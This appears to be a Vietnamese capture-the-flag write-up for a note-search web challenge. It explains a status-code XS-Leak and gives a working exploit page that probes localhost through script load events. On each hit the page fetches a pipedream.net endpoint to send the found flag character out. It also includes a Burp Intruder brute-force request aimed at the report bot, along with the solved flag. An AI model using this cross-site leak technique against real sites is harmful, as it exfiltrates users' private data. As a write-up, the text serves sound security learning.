## Leak me if you can

Bài whitebox: Challenge là 1 trang có chức năng tạo note, đọc note và tìm kiếm note. Có 2 loại note là `is_admin` `1` hoặc `0`, flag nằm ở note `is_admin`.
Ngoài ra có chức năng report báo cáo 1 url cho admin và 1 con bot sẽ tự động đến xem.

```js
    async init() {
        return this.db.exec(`
            PRAGMA case_sensitive_like=ON; 

            DROP TABLE IF EXISTS notes;

            CREATE TABLE IF NOT EXISTS notes (
                id          INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                note        VARCHAR(255) NOT NULL,
                author       VARCHAR(255) NOT NULL,
                is_admin    BOOLEAN NOT NULL
            );

            INSERT INTO notes (id, note, author, is_admin) VALUES (0, "REDACTED", "nhienit", 1);
        `);
    }
```

Để là admin thì cần truy cập từ localhost

Review source code thì các chức năng đều an toàn, chú ý tới:
```js
// ........
const isAdmin = req => ((req.ip == '127.0.0.1') ? 1 : 0);
// ...........

router.get('/notes/search', (req, res) => {
	if(req.query.note) {
		const query = `${req.query.note}%`;
		return db.findNote(query, isAdmin(req))
			.then(notes => {
				if(notes.length == 0) return res.status(404).send(response('No  results!'));
				res.json(notes);
			})
			.catch(() => res.send(response('Something went wrong! Please try again!')));
	}
	return res.status(403).json(response('Missing "note" parameters!'));
});

// .............
```

Nếu tìm thấy note status code sẽ là `200` trong khi nếu không thì `404`. Ok đây là 1 bài XSLeak, ta có thể dùng script để load thử route `/notes/search` tìm kiếm note, nếu đúng thì onload được, 404 sẽ là error: https://xsleaks.dev/docs/attacks/error-events/

`index.html`:
```html
<head>
  
</head>

<script>
function probeError(url, flag) {
  let script = document.createElement('script');
  script.src = url;
  script.onload = () => {
    fetch('https://eog308gfphj31fc.m.pipedream.net?flag='+flag)
  };
  script.onerror = () => console.log('Error event triggered');
  document.head.appendChild(script);
}

const urlParams = new URLSearchParams(window.location.search);
flag = urlParams.get('flag');

url = 'http://localhost:13337/notes/search?note='+flag;
probeError(url, flag);
</script>
```

Brute force thủ công bằng *Burpsuite Intruder* khi submit url đến `/report` cho con bot nhìn:
```
POST /report HTTP/1.1
Host: localhost:13337
Content-Length: 50
Content-Type: application/x-www-form-urlencoded
Connection: close

url=https://451d-8-21-11-111.ap.ngrok.io/?flag=KCSC{W0W_H4§target§
```

Flag chỉ có con bot nằm ở localhost mới thấy được. Bằng cách submit url trỏ đến trang `index.html` mình tự host, nếu onload không lỗi thì `fetch` đến pipe dream cùng kí tự vừa tìm thấy được, lặp đi lặp lại cho đến khi tìm được flag.

Có cách automate bằng python nhanh hơn nhưng công code thì mệt hơn

**flag**: `KCSC{W0W_H4v3_U_h3ard_4b0ut_XS_L34k?}`
